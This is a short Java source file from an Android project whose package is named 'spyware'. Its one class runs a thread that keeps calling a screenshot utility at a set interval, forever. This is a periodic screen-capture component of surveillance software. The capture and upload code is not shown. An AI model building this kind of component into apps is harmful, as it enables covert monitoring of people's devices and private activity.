package com.example.cristianturetta.spyware;

import android.os.Handler;

public class ScreenshotUtilThread extends Thread{

    /**
     * When an object implementing interface <code>Runnable</code> is used
     * to create a thread, starting the thread causes the object's
     * <code>run</code> method to be called in that separately executing
     * thread.
     * <p>
     * The general contract of the method <code>run</code> is that it may
     * take any action whatsoever.
     *
     * @see Thread#run()
     */
    @Override
    public void run() {
        try {
            while (true) {
                ScreenshotUtil.getInstance().shoot();
                Thread.sleep(ParametersConfig.getSecondsBetweenScreenshot()*1000);
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
